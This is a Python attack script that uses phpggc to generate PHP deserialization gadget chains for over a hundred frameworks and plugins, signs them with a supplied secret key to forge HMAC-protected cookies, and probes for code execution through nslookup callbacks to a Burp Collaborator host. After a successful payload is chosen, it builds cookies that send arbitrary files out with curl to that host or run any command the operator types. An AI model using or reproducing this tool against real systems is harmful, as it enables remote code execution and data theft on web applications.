import subprocess
import base64
import hashlib
import hmac
import json
import pyperclip
import pyfiglet

pyperclip.set_clipboard("xclip")

# Colores para salida en consola
GREEN = "\033[92m"
WHITE = "\033[97m"
RESET = "\033[0m"

# List payloads
PAYLOADS = [
    "Bitrix/RCE1", "CakePHP/RCE1", "CakePHP/RCE2", "CodeIgniter4/RCE1", "CodeIgniter4/RCE2", "CodeIgniter4/RCE3", "CodeIgniter4/RCE4", "CodeIgniter4/RCE5", "CodeIgniter4/RCE6", "Doctrine/FW1", "Doctrine/FW2", "Doctrine/RCE1", "Doctrine/RCE2", "Dompdf/FD1", "Dompdf/FD2", "Drupal7/FD1", "Drupal7/RCE1", "Drupal9/RCE1", "Guzzle/FW1", "Guzzle/INFO1", "Guzzle/RCE1", "Horde/RCE1", "Kohana/FR1", "Laminas/FD1", "Laminas/FW1", "Laravel/RCE1", "Laravel/RCE2", "Laravel/RCE3", "Laravel/RCE4", "Laravel/RCE5", "Laravel/RCE6", "Laravel/RCE7", "Laravel/RCE8", "Laravel/RCE9", "Laravel/RCE10", "Laravel/RCE11", "Laravel/RCE12", "Laravel/RCE13", "Laravel/RCE14", "Laravel/RCE15", "Laravel/RCE16", "Magento/FW1", "Magento/SQLI1", "Magento2/FD1", "Monolog/FW1", "Monolog/RCE1", "Monolog/RCE2", "Monolog/RCE3", "Monolog/RCE4", "Monolog/RCE5", "Monolog/RCE6", "Monolog/RCE7", "Monolog/RCE8", "Monolog/RCE9", "Phalcon/RCE1", "Phing/FD1", "PHPCSFixer/FD1", "PHPCSFixer/FD2", "PHPExcel/FD1", "PHPExcel/FD2", "PHPExcel/FD3", "PHPExcel/FD4", "PHPSecLib/RCE1", "Pydio/Guzzle/RCE1", "Slim/RCE1", "Smarty/FD1", "Smarty/SSRF1", "Spiral/RCE1", "Spiral/RCE2", "SwiftMailer/FD1", "SwiftMailer/FD2", "SwiftMailer/FR1", "SwiftMailer/FW1", "SwiftMailer/FW2", "SwiftMailer/FW3", "SwiftMailer/FW4", "Symfony/FD1", "Symfony/FW1", "Symfony/FW2", "Symfony/RCE1", "Symfony/RCE2", "Symfony/RCE3", "Symfony/RCE4", "Symfony/RCE5", "Symfony/RCE6", "Symfony/RCE7", "Symfony/RCE8", "TCPDF/FD1", "ThinkPHP/FW1", "ThinkPHP/FW2", "ThinkPHP/RCE1", "ThinkPHP/RCE2", "ThinkPHP/RCE3", "ThinkPHP/RCE4", "Typo3/FD1", "vBulletin/RCE1", "WordPress/Dompdf/RCE1", "WordPress/Dompdf/RCE2", "WordPress/Guzzle/RCE1", "WordPress/Guzzle/RCE2", "WordPress/P/EmailSubscribers/RCE1", "WordPress/P/EverestForms/RCE1", "WordPress/P/WooCommerce/RCE1", "WordPress/P/WooCommerce/RCE2", "WordPress/P/YetAnotherStarsRating/RCE1", "WordPress/PHPExcel/RCE1", "WordPress/PHPExcel/RCE2", "WordPress/PHPExcel/RCE3", "WordPress/PHPExcel/RCE4", "WordPress/PHPExcel/RCE5", "WordPress/PHPExcel/RCE6", "Yii/RCE1", "Yii/RCE2", "Yii2/RCE1", "Yii2/RCE2", "ZendFramework/FD1", "ZendFramework/RCE1", "ZendFramework/RCE2", "ZendFramework/RCE3", "ZendFramework/RCE4", "ZendFramework/RCE5"
]

# SECRET_KEY y Burp Collaborator Server
secret_key = input("\nEnter the SECRET_KEY: ")
burp_server = input("\nEnter Burp Collaborator server: ")

def generar_payload(payload, command):
    sanitized_payload = payload.replace("/", ".")
    command_exec = f"phpggc {payload} exec '{command}' | base64 -w 0"
    result = subprocess.run(command_exec, shell=True, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"Error ejecutando {payload}")
        return None
    
    object_b64 = result.stdout.strip()
    sig_hmac = hmac.new(secret_key.encode(), object_b64.encode(), hashlib.sha1).hexdigest()
    return json.dumps({"token": object_b64, "sig_hmac_sha1": sig_hmac})

cookies = []
output_file = "cookies.txt"

with open(output_file, "w") as f:
    for payload in PAYLOADS:
        cookie = generar_payload(payload, f"/usr/bin/nslookup {payload.replace('/', '.')}.{burp_server}")
        if cookie:
            cookies.append(cookie)
            print("#" * 80)
            print(f"\n{GREEN}{payload}{RESET}\n")
            print(f"{WHITE}{cookie}{RESET}\n")
            f.write(cookie + "\n")

pyperclip.copy("\n".join(cookies))
print(f"\nAll cookies have been stored in {GREEN}{output_file} and copied to the clipboard.{RESET}")

correcto = 0
payload_correcto = None

while True:
    if correcto == 0:
        while True:
            print("\nDid any of them work??\n")
            print("1. Yes")
            print("2. No\n")
            respuesta = input("Select an option: ").strip()

            if respuesta == "1":
                break  
            elif respuesta == "2":
                exit()  
            else:
                print(f"\nInvalid option. Please try again.")

        columnas = 3
        ancho_columna = 35
        
        for i, payload in enumerate(PAYLOADS, 1):
            print(f"{i:3}. {payload:<{ancho_columna}}", end="  ")
    
            if i % columnas == 0:
                print()

        print()

        while True:
            try:
                seleccion = int(input(f"\nSelect the number of the payload that worked: \n"))
                if 1 <= seleccion <= len(PAYLOADS):  
                    payload_correcto = PAYLOADS[seleccion - 1]
                    correcto = 1
                    break  
                else:
                    print(f"Please select a number between 1 and {len(PAYLOADS)}.")
            except ValueError:
                print("Invalid entry. You must enter a whole number.")


    print("\nWhat do you want to do?\n")
    print("1. Exfiltrate file")
    print("2. Execute custom command")
    tipo_accion = input("Select an option: ").strip()
    
    if tipo_accion == "1":
        ruta_archivo = input("\nEnter the absolute path to the file: ").strip()
        cookie = generar_payload(payload_correcto, f"/usr/bin/curl --data @{ruta_archivo} {burp_server}")
    else:
        comando_personalizado = input("\nEnter the command to be executed: ").strip()
        comando_final = f"{comando_personalizado} && /usr/bin/nslookup success.{burp_server}"
        cookie = generar_payload(payload_correcto, comando_final)
    
    if cookie:
        print(f"\n{GREEN}{payload_correcto}{RESET}\n")
        print(f"{WHITE}{cookie}{RESET}\n")
        with open("cookies.txt", "a") as f:
            f.write(cookie + "\n")
        pyperclip.copy(cookie)
    
    while True:
        print("\nDo you want to generate another custom payload?\n")
        print("1. Yes")
        print("2. Exit\n")
        respuesta = input("Select an option: ").strip()

        if respuesta == "1":
            break  
        elif respuesta == "2":
            exit() 
        else:
            print("Invalid option. Please try again.")
